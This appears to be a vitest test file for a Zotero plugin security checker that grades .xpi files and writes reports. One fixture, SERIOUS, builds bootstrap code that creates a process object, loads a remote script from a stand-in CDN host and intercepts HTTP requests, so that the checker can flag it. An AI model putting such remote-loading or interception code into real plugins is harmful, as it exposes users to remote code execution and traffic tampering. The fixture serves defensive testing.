import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gradeOf } from "@atlas/schema";
import { describe, expect, it } from "vitest";
import { capGrade, checkXpi } from "../src/check/check.ts";
import {
  buildCheckDataFile,
  type CheckData,
  type CheckDataFile,
  loadCheckData,
} from "../src/check/data.ts";
import { costlyFindings, failsOn, renderReport } from "../src/check/report.ts";
import { main, parseArgs } from "../src/check/run.ts";
import { paths } from "../src/paths.ts";
import { manifestJson } from "./helpers/scan.ts";
import { buildZip } from "./helpers/zip.ts";

const dataFile = async (): Promise<CheckDataFile> => ({
  schemaVersion: 1,
  builtAt: "2026-11-20T00:00:00.000Z",
  hostsYaml: await readFile(join(paths.pipelineData, "hosts.yaml"), "utf8"),
  zoteroVersions: {
    release: { mac: "10.0.9" },
    beta: {},
    dev: { mac: "11.0-dev.5" },
    currentMajor: 10,
    nextMajor: 11,
    lastTagPerMajor: { 9: "9.0.6", 10: "10.0.9" },
  },
  libraries: { catalogue: { schemaVersion: 1, libraries: {} }, sets: {} },
  reviews: { slugs: {}, findings: {}, network: {} },
});

let cached: CheckData | undefined;
const data = async () => {
  cached ??= loadCheckData(await dataFile());
  return cached;
};

const xpi = (files: Record<string, string>) =>
  buildZip({ "manifest.json": manifestJson(), ...files });

const CLEAN = xpi({ "bootstrap.js": "function startup() { Zotero.debug('hello'); }" });
const OPENAI = xpi({
  "bootstrap.js": `fetch("https://api.openai.com/v1/chat/completions", { method: "POST" });`,
});
const SERIOUS = xpi({
  "bootstrap.js": `
    const p = Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
    Services.scriptloader.loadSubScript("https://cdn.example.net/remote.js");
    Services.obs.addObserver(observer, "http-on-modify-request");`,
});
const REVIEW = xpi({
  "bootstrap.js": `Services.obs.addObserver(observer, "http-on-modify-request");`,
});

describe("plugin check", () => {
  it("grades a plain plugin A and says why it stops there", async () => {
    const r = await checkXpi("clean.xpi", CLEAN, await data());
    expect(r.grade).toBe("A");
    expect(r.because).toBe("every code check came out low");
    const md = renderReport([r], await data(), new Date("2026-11-21"));
    expect(md).toContain("**Grade from the code: A**, because every code check came out low");
    expect(md).toContain("stops at A");
    expect(md).toContain("Not checked before release");
    expect(md).toContain("Our live test in Zotero");
    expect(md).toContain("None. Every code check came out low.");
  });

  it("never grades above A, whatever the card says", async () => {
    expect(capGrade("A+")).toBe("A");
    expect(capGrade("A")).toBe("A");
    expect(capGrade("B")).toBe("B");
    // The card the check builds has no test, so the site's own rule gives A, never A+.
    const r = await checkXpi("clean.xpi", CLEAN, await data());
    expect(r.card.tested).toBeUndefined();
    expect(gradeOf({ trust: r.card, scan: { status: "analyzed", reason: null } } as never)).toBe(
      "A",
    );
  });

  it("lists destinations by who runs them", async () => {
    const r = await checkXpi("ai.xpi", OPENAI, await data());
    const md = renderReport([r], await data(), new Date("2026-11-21"));
    expect(md).toContain("### Where it sends data");
    expect(md).toContain("**AI services**: api.openai.com (OpenAI)");
  });

  it("lists capabilities with their concern and the findings that cost points", async () => {
    const r = await checkXpi("serious.xpi", SERIOUS, await data());
    expect(r.grade).toBe("C");
    expect(r.because).toMatch(/^it /);
    const md = renderReport([r], await data(), new Date("2026-11-21"));
    expect(md).toContain("| High concern |");
    expect(md).toContain("### Findings that cost grade points");
    expect(md).toContain("- **High concern.**");
    expect(costlyFindings(r.card).length).toBeGreaterThan(0);
  });

  it("prints the versions and the day of its tables, and warns when they are old", async () => {
    const r = await checkXpi("clean.xpi", CLEAN, await data());
    const fresh = renderReport([r], await data(), new Date("2026-11-21"));
    expect(fresh).toMatch(
      /Analyzer \d+\.\d+\.\d+, rules .*, hosts table .*, tables built 2026-11-20/,
    );
    expect(fresh).not.toContain("days old");
    const old = renderReport([r], await data(), new Date("2027-02-01"));
    expect(old).toContain("days old");
  });

  it("applies a hand review to the exact file it names, and says so", async () => {
    const base = await dataFile();
    const probe = await checkXpi("review.xpi", REVIEW, await data());
    expect(probe.grade).toBe("B");
    const withReview: CheckDataFile = {
      ...base,
      reviews: {
        slugs: { "someone/fixture": "fixture" },
        network: {},
        findings: {
          fixture: [
            {
              schemaVersion: 1,
              slug: "fixture",
              version: "1.0.0",
              sha256: probe.sha256,
              reviewedAt: "2026-11-01",
              method: "test",
              real: false,
              concern: "low",
              rule: "CAP-NETWORK-INTERCEPT",
              summary: "Not real.",
              facts: {},
              capability: "network-intercept",
            },
          ],
        },
      },
    };
    const r = await checkXpi("review.xpi", REVIEW, loadCheckData(withReview), {
      repo: "someone/fixture",
    });
    expect(r.reviewedAs).toBe("fixture");
    expect(r.reviewsApplied).toEqual([{ capability: "network-intercept", how: "file" }]);
    expect(r.grade).toBe("A");
    // Without the repository the same file is still found by its hash.
    const bySha = await checkXpi("review.xpi", REVIEW, loadCheckData(withReview));
    expect(bySha.reviewedAs).toBe("fixture");
  });

  it("rejects a file that isn't a Zotero plugin", async () => {
    await expect(checkXpi("x.xpi", new Uint8Array([1, 2, 3]), await data())).rejects.toThrow(
      /not a readable \.xpi/,
    );
    await expect(checkXpi("x.xpi", buildZip({ "readme.txt": "hi" }), await data())).rejects.toThrow(
      /not a Zotero plugin/,
    );
  });

  it("ships tables built from the repository", async () => {
    const built = loadCheckData(await buildCheckDataFile(paths.root));
    expect(built.hostsVersion).toMatch(/^\d{4}\.\d{2}\.\d{2}/);
    expect(built.libraries.has("jquery")).toBe(true);
  });
});

describe("--fail-on", () => {
  it("fails on the grade it names or worse, and never on an ungraded file", () => {
    expect(failsOn("C", "C")).toBe(true);
    expect(failsOn("B", "C")).toBe(false);
    expect(failsOn("B", "B")).toBe(true);
    expect(failsOn("C", "B")).toBe(true);
    expect(failsOn("A", "B")).toBe(false);
    expect(failsOn("–", "B")).toBe(false);
    expect(failsOn("C", undefined)).toBe(false);
  });

  it("reads its options from flags, then from the action's inputs", () => {
    expect(parseArgs(["--fail-on", "b", "--repo=a/b", "x.xpi"], {})).toMatchObject({
      failOn: "B",
      repo: "a/b",
      files: ["x.xpi"],
    });
    expect(
      parseArgs([], { INPUT_XPI: "a.xpi\nb.xpi", "INPUT_FAIL-ON": "C", GITHUB_REPOSITORY: "o/n" }),
    ).toMatchObject({ failOn: "C", repo: "o/n", files: ["a.xpi", "b.xpi"] });
    expect(parseArgs(["x.xpi"], { "INPUT_FAIL-ON": "none" }).failOn).toBeUndefined();
    expect(() => parseArgs(["--fail-on", "A", "x.xpi"], {})).toThrow(/B or C/);
  });

  it("exits 0 by default, 1 when the threshold is reached, and writes the step summary", async () => {
    const dir = await mkdtemp(join(tmpdir(), "check-test-"));
    await writeFile(join(dir, "clean.xpi"), CLEAN);
    await writeFile(join(dir, "serious.xpi"), SERIOUS);
    const summary = join(dir, "summary.md");
    const dataPath = join(dir, "data.json");
    await writeFile(dataPath, JSON.stringify(await dataFile()));
    const env = { ATLAS_CHECK_DATA: dataPath, GITHUB_STEP_SUMMARY: summary };
    const quiet = { out: () => {}, err: () => {} };

    expect(await main(["serious.xpi"], env, quiet, dir)).toBe(0);
    expect(await main(["--fail-on", "C", "clean.xpi"], env, quiet, dir)).toBe(0);
    expect(await main(["--fail-on", "B", "clean.xpi"], env, quiet, dir)).toBe(0);
    expect(await main(["--fail-on", "C", "serious.xpi"], env, quiet, dir)).toBe(1);
    expect(await main(["--fail-on", "B", "*.xpi"], env, quiet, dir)).toBe(1);
    expect(await readFile(summary, "utf8")).toContain("# Zotero Plugins check");
    // Nothing to check, or a file that isn't a plugin: it couldn't run.
    expect(await main(["missing/*.xpi"], env, quiet, dir)).toBe(2);
  });

  it("prints the report to the terminal when there is no step summary", async () => {
    const dir = await mkdtemp(join(tmpdir(), "check-test-"));
    await writeFile(join(dir, "clean.xpi"), CLEAN);
    const dataPath = join(dir, "data.json");
    await writeFile(dataPath, JSON.stringify(await dataFile()));
    const out: string[] = [];
    const code = await main(
      ["clean.xpi"],
      { ATLAS_CHECK_DATA: dataPath },
      { out: (t) => out.push(t), err: () => {} },
      dir,
    );
    expect(code).toBe(0);
    expect(out.join("")).toContain("# Zotero Plugins check");
  });
});
